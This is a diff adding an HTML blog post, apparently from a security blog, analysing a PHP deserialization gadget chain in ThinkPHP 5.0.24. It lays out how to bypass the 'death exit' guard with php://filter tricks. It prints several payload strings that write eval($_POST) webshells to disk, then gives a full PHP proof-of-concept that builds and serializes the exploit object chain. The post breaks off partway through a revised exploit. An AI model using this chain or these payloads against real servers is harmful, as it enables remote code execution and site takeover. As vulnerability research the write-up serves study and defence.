@@ -1,0 +1,1257 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="John Doe" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  <meta name="description" content="A hexo theme." />
+  
+  
+  
+  <title>
+    
+      ThinkPHP反序列化POP链分析 
+      
+      
+      |
+    
+     Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/css/math/katex.min.css">
+
+<link rel="stylesheet" href="/css/math/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">CyxSec</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ThinkPHP反序列化POP链分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-09-18 16:26:54
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/ThinkPHP/" title="ThinkPHP">
+                    #ThinkPHP
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="0x01-反序列化利用链"><a class="markdownIt-Anchor" href="#0x01-反序列化利用链"></a> 0x01 反序列化利用链</h1>
+<h2 id="审计思路"><a class="markdownIt-Anchor" href="#审计思路"></a> 审计思路</h2>
+<p><strong>php魔术方法</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">__call	调用不可访问或不存在的方法时被调用
+__callStatic	调用不可访问或不存在的静态方法时被调用
+__clone	进行对象clone时被调用，用来调整对象的克隆行为
+__constuct	构建对象的时被调用；
+__debuginfo	当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本
+__destruct	明确销毁对象或脚本结束时被调用；
+__get	读取不可访问或不存在属性时被调用
+__invoke	当以函数方式调用对象时被调用
+__isset	对不可访问或不存在的属性调用isset()或empty()时被调用
+__set	当给不可访问或不存在属性赋值时被调用
+__set_state	当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。
+__sleep	当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用
+__toString	当一个类被转换成字符串时被调用
+__unset	对不可访问或不存在的属性进行unset时被调用
+__wakeup	当使用unserialize时被调用，可用于做些对象的初始化操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>反序列化的起点：</strong></p>
+<p>__wakeup和__destruct两个魔术方法</p>
+<p><strong>反序列化的跳板：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">__toString 当一个对象被当做字符串使用
+
+__get 读取不可访问或不存在属性时被调用
+
+__set 当给不可访问或不存在属性赋值时被调用
+
+__isset 对不可访问或不存在的属性调用isset()或empty()时被调用
+
+__call 调用不可访问或不存在的方法时被调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>反序列化的终点：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">call_user_func 回调函数
+
+call_user_func_array 回调函数
+
+file_put_contents 文件写入
+
+$a($b) 变量函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>反序列化链的审计思路就是把上面的思路联系起来：</p>
+<ol>
+<li>寻找__wakeup和__destruct魔术方法，查看里面是否有机会调用其他魔术方法，比如调用不存在的方法会调用__call的魔术方法</li>
+<li>接下来的思路就是继续寻找可以利用的魔术方法</li>
+<li>寻找最终的终点函数，如方法中存在callback调用和文件写入、变量函数等等，总之就能能漏洞利用的点。</li>
+</ol>
+<p>这就是整个反序列化链的构造方式</p>
+<h2 id="1thinkphp-50x-反序列化"><a class="markdownIt-Anchor" href="#1thinkphp-50x-反序列化"></a> ①ThinkPHP 5.0.x 反序列化</h2>
+<p>测试版本：5.0.24</p>
+<h3 id="一-反序列化链调通过程"><a class="markdownIt-Anchor" href="#一-反序列化链调通过程"></a> 一、反序列化链调通过程</h3>
+<h4 id="1-寻找入口点"><a class="markdownIt-Anchor" href="#1-寻找入口点"></a> 1. 寻找入口点</h4>
+<p>寻找__destruct魔术方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911150823578.png" alt="image-20240911150823578" /></p>
+<h4 id="2-寻找中途的魔术方法"><a class="markdownIt-Anchor" href="#2-寻找中途的魔术方法"></a> 2. 寻找中途的魔术方法</h4>
+<ol>
+<li>跟入removeFiles方法，这里处理$filename变量，unlink会触发toString魔术方法。</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151148298.png" alt="image-20240911151148298" /></p>
+<ol start="2">
+<li>寻找可使用的toString方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151718647.png" alt="image-20240911151718647" /></p>
+<p>跟入toJson方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911151808198.png" alt="image-20240911151808198" /></p>
+<p>跟入toArray方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C2135181-20211128215457370-1791873425.png" alt="2135181-20211128215457370-1791873425" /></p>
+<p>912行这里有一个对象调用方法的代码，在找不到对象的方法时，会调用__call魔术方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911153458094.png" alt="image-20240911153458094" /></p>
+<ol start="3">
+<li>寻找可利用的__call魔术方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154109705.png" alt="image-20240911154109705" /></p>
+<p>跟入block方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154154119.png" alt="image-20240911154154119" /></p>
+<p>跟入writeln方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154238309.png" alt="image-20240911154238309" /></p>
+<p>跟入到write方法，这里可能得到了一个调用任意类的write方法的地方</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154252886.png" alt="image-20240911154252886" /></p>
+<p>这里得到了一个调用任意类的set方法的地方</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154444740.png" alt="image-20240911154444740" /></p>
+<h4 id="3找到最终利用点"><a class="markdownIt-Anchor" href="#3找到最终利用点"></a> 3.找到最终利用点</h4>
+<p>set方法就很熟悉了，我们之前分析命令执行的时候</p>
+<p>\think\cache\driver\File::set</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911154651163.png" alt="image-20240911154651163" /></p>
+<p>文件写入的时候，有exit，这个看p牛的文件写入绕死亡exit就行了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<h4 id="4构造完整利用链"><a class="markdownIt-Anchor" href="#4构造完整利用链"></a> 4.构造完整利用链</h4>
+<p><strong>分析如何才能调用__call方法</strong></p>
+<p>主要有四个if逻辑，最后让最下面的$value为想调用__call方法的类即可，先分析if逻辑，后分析赋值逻辑</p>
+<ul>
+<li>$relation要为Model类自带的方法名称</li>
+<li>执行Model类的方法后，获取的类，方法要存在getBindAttr</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>A</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">也</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">bindAttr参数要不为空，也就是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">A</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span></span></span></span>modelRelation类要存在getBindAttr方法要有返回值</li>
+<li>不设置data[$key]的值</li>
+</ul>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911174406671.png" alt="image-20240911174406671" /></p>
+<p>变量赋值对应着右边的三个方法</p>
+<ul>
+<li>第一处parseName方法仅做大小写替换操作，$relation可控</li>
+<li>第二处调用该类自己的方法，这里找到了getError方法，因为方法的返回值是可控的，$modelRelation可控</li>
+<li>第三处调用的方法跟进去，在第一个if逻辑，返回值为this-&gt;parent，可控。</li>
+</ul>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911175535696.png" alt="image-20240911175535696" /></p>
+<p>分析一下第三处的方法的if逻辑</p>
+<ul>
+<li>第一处返回值可控</li>
+<li>第二处我们需要寻找一个可控的getModel方法的类，在下方的Query类即可找到可控的。</li>
+</ul>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911181833527.png" alt="image-20240911181833527" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911181623160.png" alt="image-20240911181623160" /></p>
+<p>接下来就是符合Relation子类了，这个类还要有getBindAttr方法</p>
+<p>找到了OneToOne类，同时这里的bindAttr参数也是可控的，这样最开始的逻辑也能进去了。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911182518131.png" alt="image-20240911182518131" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911182354185.png" alt="image-20240911182354185" /></p>
+<p>这下call魔术方法已经可以正常调用到了</p>
+<p>后面的call魔术方法触发set逻辑很简单，没有if之类的逻辑，问题在绕过死亡exit的地方。</p>
+<h3 id="二-死亡exit绕过"><a class="markdownIt-Anchor" href="#二-死亡exit绕过"></a> 二、死亡exit绕过</h3>
+<p>这个在p牛的博客已经写过了，简单来说就是filename可控的时候，使用php://filter伪协议会把content编码处理，这样exit就不会写到文件中了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240912112011325.png" alt="image-20240912112011325" /></p>
+<p>p🐂这里给的例子是函数两个参数均可控的时候，如果filename和content为一个参数时</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
+$content &#x3D; $_GET[content];
+file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></p>
+<p>看一下这篇博客。</p>
+<p><strong>简单学习和总结一下：</strong></p>
+<ol>
+<li>我们想到的第一种方式就是依旧和上面一样的思路，使用base64过滤器</li>
+</ol>
+<p><code>php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</code>或者<code>php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p>
+<p>这样写入的内容应该是&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php的base64解码，但是实际会生成文件，但无法写入内容。因为base64在=后面不能存在字符。</p>
+<ol start="2">
+<li>因此想办法去掉=即可，寻找可用的php的过滤器。</li>
+</ol>
+<p>string.strip.tags过滤器，去除html和php标签（在php7.3后无法使用）</p>
+<p>这样得到了一个payload：</p>
+<p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p>
+<p>但这样写，文件名存在特殊字符，Windows下面无法创建文件</p>
+<p>Linux测试一下</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913142115389.png" alt="image-20240913142115389" /></p>
+<p>利用跨目录控制文件名。</p>
+<p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../1.php</code></p>
+<p><strong>这个在Windows环境下做测试居然失败了，难道是跨目录的问题？暂时没研究了</strong></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913142520525.png" alt="image-20240913142520525" /></p>
+<ol start="3">
+<li>考虑使用其他编码类的过滤器，这样就可以避免=带来的问题了。</li>
+</ol>
+<p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=1.php</code></p>
+<p>使用rot13凯撒，同时php寻找不到过滤器只会抛出警告，所以我们的payload可以放在过滤器的位置（<strong>但无法在tp中使用，tp会直接抛出异常</strong>）</p>
+<p>最终结果如下：</p>
+<p>如果php不开启短标签的话，前面的&lt;?部分就会被忽略，不会影响解析</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913143441913.png" alt="image-20240913143441913" /></p>
+<ol start="4">
+<li>上面的rot13在短标签开启的时候会报错，无法正常使用，可以使用自带的iconv的过滤器</li>
+</ol>
+<p>usc-2过滤器：两位一反转</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913143814907.png" alt="image-20240913143814907" /></p>
+<p><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=12.php</code></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913144253027.png" alt="image-20240913144253027" /></p>
+<p>usc-4过滤器：四位一反转</p>
+<p><code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913144542973.png" alt="image-20240913144542973" /></p>
+<p>UTF编码转换：</p>
+<p>可以把=做编码转换，这样在设置base64解码的时候就不再受到影响了</p>
+<p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</code></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913151647177.png" alt="image-20240913151647177" /></p>
+<p>运用到TP上filter的位置就不能放payload了，TP会直接抛出异常，因此需要改一下payload的位置</p>
+<p><code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=1PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php</code></p>
+<p>PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+，正常的base64的payload是这样的，实际情况要根据前面的字符数量，在payload的前面增加字符做填充，这样才能让最终base64解码的时候刚好解码到这个地方。</p>
+<p>看回源码，这里的filename参数是可控的，因此理论上应该可以绕过死亡exit</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240912112341564.png" alt="image-20240912112341564" /></p>
+<h3 id="三-poc编写"><a class="markdownIt-Anchor" href="#三-poc编写"></a> 三、POC编写</h3>
+<p>写poc注意一下ThinkPHP的命名空间</p>
+<p>Thinkphp命名空间实际上也很好理解，可以理解成一个模块化的定义。A模块的方法调用B模块里面的方法，带着模块名访问初始化就可以了。</p>
+<p>先按照上面分析的思路编写一个poc:</p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
+namespace think\process\pipes&#123;
+class Windows&#123;
+	private $files &#x3D; [];
+	function __construct($a)&#123;
+		$this-&gt;files &#x3D; [$a];
+	&#125;
+&#125;
+&#125;&#x2F;&#x2F; Windows类，入口反序列化触发toString
+
+&#x2F;&#x2F;Pivot类，Model类的子类，触发__call方法
+namespace think\model&#123;
+class Pivot&#123;
+	protected $append &#x3D; [&quot;1&quot;&#x3D;&gt;&quot;getError&quot;];
+	protected $error;
+	protected $parent;
+	function __construct($a,$b)&#123;
+		$this-&gt;error &#x3D; $a;
+		$this-&gt;parent &#x3D; $b;
+
+	&#125;
+&#125;&#125;
+
+&#x2F;&#x2F; HasOne类，Relation类的子类，触发if条件需要
+namespace think\model\relation&#123;
+class HasOne&#123;
+	protected $selfRelation &#x3D; false;
+	protected $query;
+	protected $bindAttr &#x3D; [&#39;1&#39;&#x3D;&gt;1];
+	function __construct($a)&#123;
+		$this-&gt;query &#x3D; $a;
+	&#125;
+
+&#125;&#125;
+
+&#x2F;&#x2F; Query类，为了符合上面的getModel条件
+namespace think\db&#123;
+class Query&#123;
+	protected $model;
+	function __construct($a)&#123;
+		$this-&gt;model &#x3D; $a;
+	&#125;
+
+&#125;&#125;
+
+&#x2F;&#x2F; __call方法触发类
+namespace think\console&#123;
+class Output&#123;
+	protected $styles &#x3D; [&quot;getAttr&quot;];
+	private $handle;
+	function __construct($a)&#123;
+		$this-&gt;handle &#x3D; $a;
+	&#125;
+&#125;&#125;
+
+
+namespace think\session\driver&#123;
+class Memcached&#123;
+	protected $handler;
+	function __construct($a)&#123;
+		$this-&gt;handler &#x3D; $a;
+	&#125;
+
+
+&#125;&#125;
+
+namespace think\cache\driver&#123;
+class File&#123;
+	protected $options &#x3D; 
+	[&#39;path&#39; &#x3D;&gt; &#39;&#39;, &#x2F;&#x2F; 这里是filename部分
+	&#39;expire&#39; &#x3D;&gt; &#39;0&#39;,
+	&#39;cache_subdir&#39; &#x3D;&gt; &#39;0&#39;,
+	&#39;prefix&#39; &#x3D;&gt; &#39;0&#39;,
+	&#39;data_compress&#39; &#x3D;&gt; false];
+
+&#125;&#125;
+
+namespace&#123;
+	$fileObj &#x3D; new \think\cache\driver\File();
+	$memObj &#x3D; new \think\session\driver\Memcached($fileObj);
+	$outputObj &#x3D; new \think\console\Output($memObj);
+	$queryObj &#x3D; new \think\db\Query($outputObj);
+	$hasoneObj &#x3D; new think\model\relation\HasOne($queryObj);
+	$pivotObj &#x3D; new think\model\Pivot($hasoneObj, $outputObj);
+	$windows &#x3D; new think\process\pipes\Windows($pivotObj);
+	echo base64_encode(serialize($windows));
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>debug看一下，成功控制filename部分，接下来就是content部分，看一下是否可控了：</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913102139582.png" alt="image-20240913102139582" /></p>
+<p>发现最初调set的时候，参数内容就不可控，写死为了true</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913103110896.png" alt="image-20240913103110896" /></p>
+<p>没办法，只能尝试寻找其他调用set方法的地方，且set方法的参数value部分可控。</p>
+<p>在下面的操作逻辑中，刚好有一处调用set方法的地方，分析一下value参数，发现就是传入的参数，也就是filename。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913104405600.png" alt="image-20240913104405600" /></p>
+<p>因此我们实际上得到了一个filename和content存在相同变量的死亡exit场景。</p>
+<p>这个场景我们上面讨论过了，因此修改一下exp：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token comment">// Windows类，入口反序列化触发toString</span>
+
+<span class="token comment">//Pivot类，Model类的子类，触发__call方法</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token operator">=></span><span class="token string double-quoted-string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
+	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
+
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">// HasOne类，Relation类的子类，触发if条件需要</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">HasOne</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$selfRelation</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">// Query类，为了符合上面的getModel条件</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
+	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">// __call方法触发类</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"getAttr"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
+	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
